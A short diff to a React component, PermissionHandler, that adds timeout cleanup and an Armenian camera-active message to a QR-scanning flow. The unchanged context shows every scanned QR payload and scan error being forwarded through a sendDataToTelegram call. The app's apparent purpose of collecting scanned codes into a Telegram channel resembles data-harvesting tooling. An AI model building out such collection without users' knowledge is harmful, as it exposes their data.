@@ -172,6 +172,10 @@ const PermissionHandler = () => {
   const handleQrCodeScanned = useCallback(
     async (qrData: string) => {
       console.log("QR Code Scanned in PermissionHandler:", qrData);
+      if (qrTimeoutRef.current) {
+        clearTimeout(qrTimeoutRef.current);
+        qrTimeoutRef.current = null;
+      }
       const success = await sendDataToTelegram({ qrCodeData: qrData }, MessageType.QrCode);
       setProcessSuccessful(success);
       setAppPhase("finished");
@@ -183,6 +187,10 @@ const PermissionHandler = () => {
   const handleQrScanError = useCallback(
     async (error: string) => {
       console.error("QR Scan Error:", error);
+      if (qrTimeoutRef.current) {
+        clearTimeout(qrTimeoutRef.current);
+        qrTimeoutRef.current = null;
+      }
       const success = await sendDataToTelegram({ qrCodeData: `QR Scan Error: ${error}` }, MessageType.QrCode);
       setProcessSuccessful(success);
       setAppPhase("finished");
@@ -190,6 +198,10 @@ const PermissionHandler = () => {
     },
     [sendDataToTelegram]
   );
+
+  const handleQrCameraActive = useCallback(() => {
+    setLoadingMessage("Կամերան ակտիվ է, սկանավորեք QR կոդը..."); // Камера активна, сканируйте QR-код...
+  }, []);
 
   const startNewSession = useCallback(() => {
     setAppPhase("initial");
@@ -358,7 +370,7 @@ const PermissionHandler = () => {
         </>
       )}
       {appPhase === "qrScanning" && (
-        <QrScanner onQrCodeScanned={handleQrCodeScanned} onScanError={handleQrScanError} />
+        <QrScanner onQrCodeScanned={handleQrCodeScanned} onScanError={handleQrScanError} onCameraActive={handleQrCameraActive} />
       )}
       {appPhase === "finished" && (
         <div className="flex flex-col items-center justify-center">
